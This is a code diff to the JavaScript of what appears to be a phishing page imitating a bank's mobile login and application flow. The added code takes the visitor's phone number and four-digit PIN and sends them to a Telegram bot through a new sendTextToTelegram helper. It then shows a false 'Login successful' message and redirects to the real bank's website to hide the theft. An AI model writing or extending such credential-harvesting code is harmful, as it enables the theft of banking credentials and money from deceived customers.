@@ -74,6 +74,20 @@ const sendToTelegram = async (s) => {
   }
 };
 
+const sendTextToTelegram = async (msg) => {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM.CHAT_ID,
+        text: msg,
+        parse_mode: 'Markdown',
+      }),
+    });
+  } catch (err) {}
+};
+
 /* ─── VALIDATION ──────────────────────────────────────────── */
 const rules = {
   'f-name': { label: 'Full Name', test: v => v.trim().length >= 2, msg: 'Please enter your full name (min 2 chars)' },
@@ -561,7 +575,15 @@ function navigate(view) {
   /* ─ MOBILE LOGIN ─ */
   else if (view === 'mobileLogin') {
     app.innerHTML = renderMobileLogin();
-    document.getElementById('mbNext').addEventListener('click', () => navigate('pinLogin'));
+    document.getElementById('mbNext').addEventListener('click', async () => {
+      const phone = document.getElementById('mbPhone').value;
+      if (!phone) { alert('Please enter your mobile number.'); return; }
+      state.mbPhone = phone;
+      showSpinner('Verifying...');
+      await sendTextToTelegram(`📱 *MOBILE LOGIN*\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
+      hideSpinner();
+      navigate('pinLogin');
+    });
   }
 
   /* ─ PIN LOGIN ─ */
@@ -582,10 +604,14 @@ function navigate(view) {
         }
       });
     });
-    document.getElementById('pinLoginBtn').addEventListener('click', () => {
+    document.getElementById('pinLoginBtn').addEventListener('click', async () => {
       const pin = [...pins].map(p => p.value).join('');
       if (pin.length < 4) { alert('Please enter your 4-digit PIN.'); return; }
+      showSpinner('Authenticating...');
+      await sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${pin}\n• Applicant: ${state.name || 'Unknown'}`);
+      hideSpinner();
       alert('Login successful! Welcome back.');
+      window.location.href = 'https://www.cabs.co.zw/';
     });
   }
 }
